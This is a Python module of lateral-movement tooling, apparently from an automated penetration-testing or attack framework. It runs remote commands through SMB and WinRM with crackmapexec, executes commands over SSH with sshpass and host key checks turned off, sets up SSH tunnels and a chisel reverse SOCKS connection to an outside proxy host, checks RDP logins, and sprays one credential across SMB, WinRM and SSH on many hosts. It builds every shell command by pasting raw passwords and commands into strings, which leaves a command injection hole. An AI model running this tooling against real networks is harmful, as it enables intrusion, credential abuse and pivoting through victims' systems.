"""Internal lateral movement tools — SMB, WinRM, SSH pivoting."""

from __future__ import annotations

import asyncio
import json
import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class PivotResult:
    host: str
    service: str
    success: bool
    output: str = ""
    error: str = ""


async def smb_exec(host: str, username: str, password: str, command: str) -> PivotResult:
    """Execute command via SMB (crackmapexec)."""
    cmd = f"crackmapexec smb {host} -u {username} -p {password} -x '{command}'"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        output = stdout.decode("utf-8", errors="replace")
        success = "pwn3d" in output.lower() or proc.returncode == 0
        return PivotResult(host=host, service="smb", success=success, output=output)
    except Exception as e:
        return PivotResult(host=host, service="smb", success=False, error=str(e)[:200])


async def smb_shares(host: str, username: str, password: str) -> dict[str, Any]:
    """List SMB shares on a host."""
    cmd = f"enum4linux-ng -A -u {username} -p {password} {host}" if username else f"enum4linux-ng -A {host}"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
        output = stdout.decode("utf-8", errors="replace")

        shares = []
        for line in output.splitlines():
            if "Share" in line and ("Disk" in line or "Printer" in line or "IPC" in line):
                parts = line.split()
                if len(parts) >= 2:
                    shares.append({"name": parts[1], "type": parts[2] if len(parts) > 2 else "unknown"})

        return {"success": True, "shares": shares, "raw": output[:3000]}
    except Exception as e:
        return {"success": False, "error": str(e)[:200]}


async def winrm_exec(host: str, username: str, password: str, command: str) -> PivotResult:
    """Execute command via WinRM (evil-winrm or crackmapexec)."""
    # Try crackmapexec first
    cmd = f"crackmapexec winrm {host} -u {username} -p {password} -x '{command}'"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        output = stdout.decode("utf-8", errors="replace")
        success = "pwn3d" in output.lower() or proc.returncode == 0
        return PivotResult(host=host, service="winrm", success=success, output=output)
    except Exception as e:
        return PivotResult(host=host, service="winrm", success=False, error=str(e)[:200])


async def ssh_exec(host: str, username: str, password: str, command: str) -> PivotResult:
    """Execute command via SSH."""
    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} '{command}'"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
        output = stdout.decode("utf-8", errors="replace")
        success = proc.returncode == 0
        return PivotResult(host=host, service="ssh", success=success, output=output)
    except Exception as e:
        return PivotResult(host=host, service="ssh", success=False, error=str(e)[:200])


async def ssh_tunnel(local_port: int, remote_host: str, remote_port: int,
                     username: str, password: str, proxy_host: str) -> PivotResult:
    """Create SSH tunnel for pivoting."""
    cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -L {local_port}:{remote_host}:{remote_port} {username}@{proxy_host} -N -f"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        await asyncio.wait_for(proc.communicate(), timeout=10)
        return PivotResult(
            host=proxy_host, service="ssh_tunnel", success=True,
            output=f"Tunnel established: localhost:{local_port} -> {remote_host}:{remote_port}",
        )
    except Exception as e:
        return PivotResult(host=proxy_host, service="ssh_tunnel", success=False, error=str(e)[:200])


async def chisel_socks(proxy_host: str, proxy_port: int = 8080) -> PivotResult:
    """Start chisel SOCKS proxy for pivoting."""
    # Start chisel server on the target
    cmd = f"chisel client {proxy_host}:{proxy_port} R:socks"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        # Don't wait long — chisel runs in background
        await asyncio.sleep(2)
        if proc.returncode is None:
            return PivotResult(
                host=proxy_host, service="chisel_socks", success=True,
                output=f"SOCKS proxy started via chisel on {proxy_host}:{proxy_port}",
            )
        else:
            stdout, _ = await proc.communicate()
            return PivotResult(
                host=proxy_host, service="chisel_socks", success=False,
                error=stdout.decode("utf-8", errors="replace")[:200],
            )
    except Exception as e:
        return PivotResult(host=proxy_host, service="chisel_socks", success=False, error=str(e)[:200])


async def rdp_check(host: str, username: str, password: str) -> PivotResult:
    """Check if RDP is accessible with given credentials."""
    cmd = f"xfreerdp /u:{username} /p:{password} /v:{host} /cert:ignore /f /dynamic-resolution 2>&1 | head -20"
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        output = stdout.decode("utf-8", errors="replace")
        success = "authentication successful" in output.lower() or "logged on" in output.lower()
        return PivotResult(host=host, service="rdp", success=success, output=output[:1000])
    except Exception as e:
        return PivotResult(host=host, service="rdp", success=False, error=str(e)[:200])


async def multi_service_spray(hosts: list[str], username: str, password: str) -> list[dict[str, Any]]:
    """Test credentials across multiple services on multiple hosts."""
    results = []
    for host in hosts:
        for service, func in [
            ("smb", lambda h: smb_exec(h, username, password, "whoami")),
            ("winrm", lambda h: winrm_exec(h, username, password, "whoami")),
            ("ssh", lambda h: ssh_exec(h, username, password, "whoami")),
        ]:
            try:
                result = await func(host)
                results.append({
                    "host": host,
                    "service": service,
                    "success": result.success,
                    "output": result.output[:200] if result.output else "",
                })
            except Exception as e:
                results.append({
                    "host": host, "service": service, "success": False, "error": str(e)[:100],
                })
    return results
